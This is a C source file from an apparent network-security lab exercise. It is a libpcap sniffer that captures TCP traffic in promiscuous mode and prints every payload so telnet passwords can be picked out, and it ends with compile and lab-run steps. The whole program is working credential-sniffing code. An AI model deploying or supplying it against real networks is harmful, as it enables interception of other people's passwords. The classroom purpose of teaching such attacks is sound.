#include <stdio.h>
#include <pcap/pcap.h>
#include "packet_heder.h"
#include <netinet/in.h>
#include<string.h>
#include <stdlib.h>


/// Task 2.1C: Sniffing Passwords.
/// In this sniffer program we capture the password
/// when somebody is using telnet on the network that we are monitoring.
/// our sniffer program has been modified from the previous sniffer
/// to capture only tcp packets  and to print out the data part
/// of a captured TCP packet (telnet uses TCP).
/// we print out the entire data part,
/// and then manually mark where the password is.


void got_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *packet) {
    ip_h *ipH = (ip_h *) (packet + SIZE_ETHERNET);
    unsigned int size_ip = IP_HL(ipH) * 4;
    if (size_ip < 20) {
        printf("\t*Invalid IP header length: %u bytes\n\n", size_ip);
        return;
    }


    tcp_h *tcpH = (tcp_h *) (packet + SIZE_ETHERNET + size_ip);
    unsigned int size_tcp = TH_OFF(tcpH) * 4;
    if (size_tcp < 20) {
        return;
    }
    unsigned char *data = (u_char *) (packet + SIZE_ETHERNET + size_ip + size_tcp);
    unsigned int size_data = ntohs(ipH->ip_len) - (size_ip + size_tcp);
    //printing all the data that we collected form the sniffed packets
    if (size_data != 0) {
        for (int i = 0; i < size_data; ++i) {
            printf("%c", data[i]);
        }
    }
}


int main() {
    pcap_t *handle;
    char errbuf[PCAP_ERRBUF_SIZE];
    struct bpf_program fp;
    char *dev = INTERFACE;
    char filter_exp_tcp[] = "tcp";
    bpf_u_int32 net = 0;
    bpf_u_int32 mask = 0;

// Open live pcap session on NIC with name dev
    handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
    if (handle == NULL) {
        fprintf(stderr, "Couldn't open device %s: %s\n", dev, errbuf);
        exit(-1);
    }
    if (pcap_lookupnet(dev, &net, &mask, errbuf) == -1) {
        fprintf(stderr, "Can't get netmask for device %s\n", dev);
        net = 0;
        mask = 0;
    }

// Compile filter_exp into tcp filter in BPF
    int compile = pcap_compile(handle, &fp, filter_exp_tcp, 1, net);
    if (compile == -1) {
        fprintf(stderr, "Couldn't compile device %s: %s\n", dev, errbuf);
        exit(-1);
    }
    int setfilter = pcap_setfilter(handle, &fp);
    if (setfilter == -1) {
        fprintf(stderr, "setfilter dose not work properly %s\n", errbuf);
        exit(-1);
    }

// Capture packets
    pcap_loop(handle, -1, got_packet, NULL);

// Close the handle
    pcap_close(handle);
    return 0;
}

/*
 * compile by: gcc pcap_sniffer_telnet_password.c -o /home/david/Labsetup/volumes/pcap_sniff_password_exe -lpcap
 * from attacker(david@ubuntu): telnet localhost
 * from attacker(david@ubuntu): run ./pcap_sniff_password_exe
 * from host: telnet 10.9.0.1 23
 */